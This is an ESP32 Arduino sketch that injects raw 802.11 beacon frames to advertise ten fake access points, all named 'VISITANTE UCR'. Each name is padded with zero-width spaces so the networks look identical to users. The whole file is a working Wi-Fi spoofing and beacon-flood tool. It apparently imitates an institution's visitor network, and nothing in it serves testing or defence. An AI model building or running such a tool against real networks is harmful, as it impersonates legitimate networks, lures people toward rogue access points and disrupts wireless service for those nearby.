#include <WiFi.h>
#include "esp_wifi.h"

#define CHANNEL 6             // Wi-Fi channel
#define NUM_FAKE_APS 10       // Number of fake APs to send
#define SSID_BASE "VISITANTE UCR"    // SSID prefix
#define BEACON_INTERVAL 100000 // Beacon interval in microseconds
#define SEND_INTERVAL 100     // Time between frame sends (ms)

uint8_t fakeMac[NUM_FAKE_APS][6];

void createFakeMACs() {
  for (int i = 0; i < NUM_FAKE_APS; i++) {
    fakeMac[i][0] = 0xDE;
    fakeMac[i][1] = 0xAD;
    fakeMac[i][2] = 0xBE;
    fakeMac[i][3] = 0xEF;
    fakeMac[i][4] = i;         // Differentiate MACs
    fakeMac[i][5] = i + 1;
  }
}

void sendBeacon(uint8_t mac[6], const char* ssid) {
  uint8_t packet[128] = {0};
  int ssid_len = strlen(ssid);
  int packet_len = 0;

  // Filled beacon header with fixed fields + placeholders for MACs and seq num
  const uint8_t beaconTemplate[] = {
    0x80, 0x00,             // Type/Subtype: Beacon
    0x00, 0x00,             // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (to overwrite)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (to overwrite)
    0x00, 0x00              // Sequence number (can be zero)
  };

  memcpy(packet, beaconTemplate, sizeof(beaconTemplate));
  packet_len += sizeof(beaconTemplate);

  // Overwrite Source MAC and BSSID with fake MAC address
  memcpy(packet + 10, mac, 6); // Source MAC
  memcpy(packet + 16, mac, 6); // BSSID

  // Sequence number can be zero for simple tests
  packet[22] = 0x00;
  packet[23] = 0x00;

  // Fixed parameters: timestamp (8 bytes), beacon interval (2 bytes), capabilities (2 bytes)
  memset(packet + packet_len, 0x00, 8); // Timestamp
  packet_len += 8;

  packet[packet_len++] = (BEACON_INTERVAL & 0xFF);
  packet[packet_len++] = (BEACON_INTERVAL >> 8);

  packet[packet_len++] = 0x31;  // Capabilities (ESS + Privacy)
  packet[packet_len++] = 0x04;

  // SSID parameter set
  packet[packet_len++] = 0x00;      // Tag: SSID parameter set
  packet[packet_len++] = ssid_len;  // Tag length
  memcpy(packet + packet_len, ssid, ssid_len);
  packet_len += ssid_len;

  // Supported Rates
  packet[packet_len++] = 0x01; // Tag Number: Supported Rates
  packet[packet_len++] = 0x08; // Tag length
  packet[packet_len++] = 0x82; // 1 Mbps (B)
  packet[packet_len++] = 0x84; // 2 Mbps (B)
  packet[packet_len++] = 0x8b; // 5.5 Mbps (B)
  packet[packet_len++] = 0x96; // 11 Mbps (B)
  packet[packet_len++] = 0x24; // 18 Mbps
  packet[packet_len++] = 0x30; // 24 Mbps
  packet[packet_len++] = 0x48; // 36 Mbps
  packet[packet_len++] = 0x6c; // 54 Mbps

  // DS Parameter Set
  packet[packet_len++] = 0x03; // Tag Number: DS Parameter Set
  packet[packet_len++] = 0x01; // Tag length
  packet[packet_len++] = CHANNEL;

  // Transmit the packet as a beacon frame
  esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_len, false);
}

void setup() {
  Serial.begin(115200);

  
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(SSID_BASE);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(CHANNEL, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);

  createFakeMACs();

  Serial.println("Sending fake beacons...");
}

void loop() {
  const char* baseSSID = SSID_BASE;

  // Zero width space UTF-8 bytes
  const char* zwsp = "\xE2\x80\x8B";

  for (int i = 0; i < NUM_FAKE_APS; i++) {
    char ssid[32];
    // Construct SSID with base + i times zero-width space
    ssid[0] = '\0';

    // Copy base SSID
    strncpy(ssid, baseSSID, sizeof(ssid) - 1);

    // Append i zero-width spaces to make SSID unique but visually identical
    for (int j = 0; j < i; j++) {
      strncat(ssid, zwsp, sizeof(ssid) - strlen(ssid) - 1);
    }

    sendBeacon(fakeMac[i], ssid);
  }
  delay(SEND_INTERVAL);
}

